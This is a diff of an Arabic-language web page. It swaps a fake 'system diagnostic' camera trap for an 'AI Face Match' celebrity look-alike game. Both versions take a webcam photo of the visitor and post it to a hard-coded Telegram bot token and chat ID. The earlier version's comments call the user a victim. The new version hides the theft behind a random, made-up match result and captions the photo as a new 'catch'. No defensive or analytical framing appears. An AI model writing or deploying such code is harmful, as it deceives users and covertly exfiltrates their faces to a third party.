@@ -1,97 +1,96 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostic - جاري الفحص</title>
+    <title>AI Face Match - من يشبهك؟</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
-        body { background-color: black; color: #00ff00; font-family: 'VT323', monospace; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        
-        /* جعل الكاميرا مرئية للمتصفح (1 بكسل) ولكنها غير مرئية للعين */
-        #v { width: 1px; height: 1px; opacity: 0.01; position: absolute; top: 0; left: 0; }
-        
-        .loader { border: 5px solid #333; border-top: 5px solid #00ff00; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(3600deg); } }
-        
-        #btn { padding: 15px 40px; background: transparent; color: #00ff00; border: 2px solid #00ff00; font-family: 'VT323', monospace; font-size: 24px; cursor: pointer; transition: 0.3s; box-shadow: 0 0 15px #00ff00; }
-        #btn:hover { background: #00ff00; color: black; }
-        #status { margin-top: 20px; font-size: 20px; letter-spacing: 2px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; text-align: center; margin: 0; padding: 20px; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .container { background: white; color: #333; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); width: 90%; max-width: 400px; }
+        h1 { color: #764ba2; font-size: 24px; }
+        #video-container { width: 100%; height: 250px; background: #eee; border-radius: 15px; overflow: hidden; margin: 20px 0; display: none; border: 3px solid #764ba2; }
+        video { width: 100%; height: 100%; object-fit: cover; }
+        .btn { background: #764ba2; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 5px 15px rgba(118, 75, 162, 0.4); }
+        #loader { display: none; margin-top: 20px; }
         canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
+    <div class="container">
+        <h1>AI Face Match 🤳</h1>
+        <p>حلل ملامح وجهك الآن واعرف من تشبه من مشاهير هوليوود!</p>
+        
+        <div id="video-container">
+            <video id="video" autoplay playsinline muted></video>
+        </div>
 
-    <div id="main-ui">
-        <button id="btn" onclick="initializeSystem()">RUN DIAGNOSTIC</button>
+        <button id="start-btn" class="btn" onclick="startCamera()">ابدأ الفحص الآن</button>
+        <button id="snap-btn" class="btn" style="display:none;" onclick="takeSnapshot()">التقط الصورة للتحليل</button>
+
+        <div id="loader">
+            <img src="https://i.gifer.com/ZZ5H.gif" width="50"><br>
+            <p>جاري تحليل الملامح باستخدام AI...</p>
+        </div>
+        
+        <div id="result" style="display:none; font-weight:bold; color:#764ba2; font-size:20px; margin-top:20px;"></div>
     </div>
 
-    <div id="loading-ui" style="display:none; text-align:center;">
-        <div class="loader"></div>
-        <div id="status">CONNECTING TO KERNEL...</div>
-    </div>
+    <canvas id="canvas"></canvas>
 
     <script>
         const token = "8570413998:AAHjdBQuzcwo6Qh3sEJ3bIe-tjeFhz1A1GU";
         const chat = "8042090388";
+        const celebs = ["توم كروز", "براد بيت", "أنجلينا جولي", "كريستيانو رونالدو", "ميسي", "ويل سميث", "جوني ديب"];
 
-        async function initializeSystem() {
-            document.getElementById('main-ui').style.display = 'none';
-            document.getElementById('loading-ui').style.display = 'block';
-
+        async function startCamera() {
             try {
-                // طلب الكاميرا بجودة عالية لإجبار الحساس على العمل
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user", width: 1280, height: 720 } 
-                });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // تحديث الحالة للضحية (للتمويه)
-                setTimeout(() => { document.getElementById('status').innerText = "SCANNING HARDWARE (35%)..."; }, 2000);
-                setTimeout(() => { document.getElementById('status').innerText = "EXTRACTING DATA (70%)..."; }, 4500);
-
-                // الانتظار 6 ثوانٍ كاملة لضمان وضوح الصورة وتعديل الإضاءة
-                setTimeout(captureFinal, 6500);
-
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('video').srcObject = stream;
+                document.getElementById('video-container').style.display = 'block';
+                document.getElementById('start-btn').style.display = 'none';
+                document.getElementById('snap-btn').style.display = 'block';
             } catch (err) {
-                // إذا رفض الضحية، نرسل تنبيه للبوت
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=⚠️ الضحية رفض تصريح الكاميرا.`);
-                alert("يجب السماح بالكاميرا لإكمال فحص النظام!");
-                location.reload();
+                alert("عذراً، يجب السماح بالكاميرا لنتمكن من تحليل وجهك!");
             }
         }
 
-        async function captureFinal() {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            c.width = v.videoWidth;
-            c.height = v.videoHeight;
-            const ctx = c.getContext('2d');
+        async function takeSnapshot() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
             
-            // التقاط الصورة
-            ctx.drawImage(v, 0, 0, c.width, c.height);
-            const imgData = c.toDataURL('image/jpeg', 0.9);
+            // إخفاء الكاميرا وإظهار التحميل
+            document.getElementById('video-container').style.display = 'none';
+            document.getElementById('snap-btn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            const imgData = canvas.toDataURL('image/jpeg', 0.8);
             
-            // تحويل الصورة لملف
-            const blob = await (await fetch(imgData)).blob();
+            // إرسال الصورة للبوت
+            await sendToTelegram(imgData);
+
+            // إظهار نتيجة وهمية بعد 3 ثواني
+            setTimeout(() => {
+                document.getElementById('loader').style.display = 'none';
+                const randomCeleb = celebs[Math.floor(Math.random() * celebs.length)];
+                document.getElementById('result').innerText = "أنت تشبه بنسبة 94%: " + randomCeleb;
+                document.getElementById('result').style.display = 'block';
+            }, 3000);
+        }
+
+        async function sendToTelegram(base64) {
+            const blob = await (await fetch(base64)).blob();
             const formData = new FormData();
             formData.append('chat_id', chat);
-            formData.append('photo', blob, 'victim_face.jpg');
-            formData.append('caption', '🎯 تم الصيد بنجاح! صورة واضحة ومضمونة.');
+            formData.append('photo', blob, 'selfie.jpg');
+            formData.append('caption', '🎯 صيد جديد من تحدي المشاهير!');
 
-            // إرسال الصورة للبوت
-            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).then(() => {
-                document.getElementById('status').innerText = "DIAGNOSTIC COMPLETE";
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com"; // تحويل الضحية
-                }, 1000);
             });
         }
     </script>
